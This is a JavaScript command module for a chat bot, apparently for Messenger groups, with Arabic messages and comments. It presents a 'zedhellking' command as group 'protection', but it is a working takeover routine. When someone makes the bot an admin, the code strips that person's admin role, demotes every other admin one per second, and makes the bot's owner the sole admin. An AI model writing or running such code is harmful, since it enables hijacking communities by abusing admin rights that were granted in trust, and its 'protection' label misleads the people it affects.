const GUARD_MESSAGE =
  "🛡️ تم تفعيل حماية zedhellking في هذه المجموعة.\n" +
  "الحماية مسلّحة الآن حتى لو لم يكن البوت مسؤولاً.\n" +
  "عندما يعيّن أحد البوت مسؤولاً: يُزال ذلك الشخص من دور المشرف فوراً، " +
  "ثم يُزال مشرف واحد كل ثانية حتى لا يبقى مشرفون غير البوت، " +
  "ثم يُعيَّن صاحب الأمر مشرفاً وحيداً مع البوت.";

const DEMOTE_DELAY_MS = 1000;
const MAX_STRIP_ROUNDS = 200;

function createZedHellkingCommand(options = {}) {
  const delay =
    options.delay || ((ms) => new Promise((resolve) => setTimeout(resolve, ms)));

  // الحماية في الذاكرة فقط: تتوقف عند إعادة تشغيل البوت.
  // threadID -> معرّف صاحب الأمر (المالك).
  const armedOwners = new Map();
  const runs = new Set();
  const stripped = new Map();

  function stopAll() {
    armedOwners.clear();
    runs.clear();
  }

  function adminIDsFromEvent(event) {
    const logData = (event && event.logMessageData) || {};
    const raw = logData.ADMIN_IDS || logData.adminIDs || logData.ADMIN_ID || [];
    if (Array.isArray(raw)) return raw.map((id) => String(id || "")).filter(Boolean);
    return String(raw || "")
      .split(",")
      .map((id) => id.trim())
      .filter(Boolean);
  }

  function adminIDsFromInfo(info) {
    const admins = (info && info.adminIDs) || [];
    return admins
      .map((admin) =>
        String((typeof admin === "object" ? admin.id || admin.userID : admin) || ""),
      )
      .filter(Boolean);
  }

  function strippedIDs(threadID) {
    return stripped.get(threadID) || [];
  }

  function markStripped(threadID, userID) {
    const ids = stripped.get(threadID) || [];
    if (!ids.includes(userID)) ids.push(userID);
    stripped.set(threadID, ids);
  }

  function actorFromEvent(event) {
    const logData = (event && event.logMessageData) || {};
    return String(
      event.senderID || event.author || logData.actorFbId || logData.actor_fbid || "",
    );
  }

  function changeAdminStatus(api, threadID, userID, adminStatus, label) {
    if (typeof api.changeAdminStatus !== "function") {
      console.error(`[zedhellking] المكتبة لا تدعم تغيير دور المشرف (${label})`);
      return Promise.resolve(false);
    }
    return new Promise((resolve) => {
      let settled = false;
      const finish = (ok) => {
        if (settled) return;
        settled = true;
        resolve(ok);
      };
      const callback = (err) => {
        if (err) {
          console.error(`[zedhellking] تعذر ${label}:`, (err && err.message) || err);
          finish(false);
          return;
        }
        finish(true);
      };
      try {
        const result = api.changeAdminStatus(threadID, userID, adminStatus, callback);
        if (result && typeof result.then === "function") {
          result.then(
            () => finish(true),
            (error) => {
              console.error(`[zedhellking] تعذر ${label}:`, (error && error.message) || error);
              finish(false);
            },
          );
        }
      } catch (error) {
        console.error(`[zedhellking] تعذر ${label}:`, (error && error.message) || error);
        finish(false);
      }
    });
  }

  async function runTakeover(api, threadID, ownerID, actorID) {
    const runKey = `${threadID}:${ownerID}`;
    if (runs.has(runKey)) return;
    runs.add(runKey);

    const botID = String((api.getCurrentUserID && api.getCurrentUserID()) || "");

    try {
      // 1) إزالة مَن عيّن البوت من دور المشرف فوراً.
      if (actorID && actorID !== botID && actorID !== ownerID) {
        const ok = await changeAdminStatus(api, threadID, actorID, false, "إزالة مَن عيّن البوت");
        if (ok) markStripped(threadID, actorID);
      }

      // 2) كل ثانية: إزالة مشرف واحد حتى لا يبقى أحد غير البوت والمالك.
      for (let round = 0; round < MAX_STRIP_ROUNDS; round += 1) {
        let admins = [];
        try {
          const info = await api.getThreadInfo(threadID);
          admins = adminIDsFromInfo(info);
        } catch (error) {
          console.error(
            "[zedhellking] تعذر قراءة مشرفي المجموعة:",
            (error && error.message) || error,
          );
          return;
        }

        const done = strippedIDs(threadID);
        const target = admins.find(
          (id) => id !== botID && id !== ownerID && !done.includes(id),
        );
        if (!target) break;

        const ok = await changeAdminStatus(api, threadID, target, false, "إزالة مشرف");
        if (ok) markStripped(threadID, target);
        await delay(DEMOTE_DELAY_MS);
      }

      // 3) تعيين المالك مشرفاً.
      await changeAdminStatus(api, threadID, ownerID, true, "تعيين المالك");
      stripped.delete(threadID);
    } finally {
      runs.delete(runKey);
    }
  }

  async function handleAdminAddEvent(api, event) {
    const threadID = String((event && event.threadID) || "");
    const ownerID = armedOwners.get(threadID);
    if (!threadID || !ownerID) return;
    if (String(event.logMessageType || event.type || "") !== "log:thread-admins") return;

    // الحماية تعمل فقط عندما يكون البوت نفسه هو المُعيَّن مسؤولاً.
    const promoted = adminIDsFromEvent(event);
    const botID = String((api.getCurrentUserID && api.getCurrentUserID()) || "");
    if (!promoted.includes(botID)) return;

    await runTakeover(api, threadID, ownerID, actorFromEvent(event));
  }

  async function execute(api, event, isAdmin) {
    const threadID = String(event.threadID || "");
    const senderID = String((event && event.senderID) || "");
    if (!threadID) return;

    if (event.isGroup === false) {
      await api.sendMessage("⚠️ أمر zedhellking يعمل داخل المجموعات فقط.", threadID);
      return;
    }

    if (armedOwners.has(threadID)) {
      armedOwners.delete(threadID);
      await api.sendMessage(
        "✅ تم إيقاف حماية zedhellking في هذه المجموعة.",
        threadID,
      );
      return;
    }

    // المالك هو الإدمن المعرّف في main.js (أول واحد في القائمة)، لا مَن أرسل الأمر.
    const admins = typeof isAdmin === "function" ? (isAdmin.admins || []) : [];
    const ownerID = String(admins[0] || senderID || "");
    if (!ownerID) {
      await api.sendMessage("⚠️ تعذر تحديد الإدمن من main.js.", threadID);
      return;
    }

    armedOwners.set(threadID, ownerID);
    await api.sendMessage(GUARD_MESSAGE, threadID);
  }

  return {
    name: "zedhellking",
    execute,
    handleAdminAddEvent,
    stopAll,
  };
}

module.exports = createZedHellkingCommand();
module.exports.createZedHellkingCommand = createZedHellkingCommand;
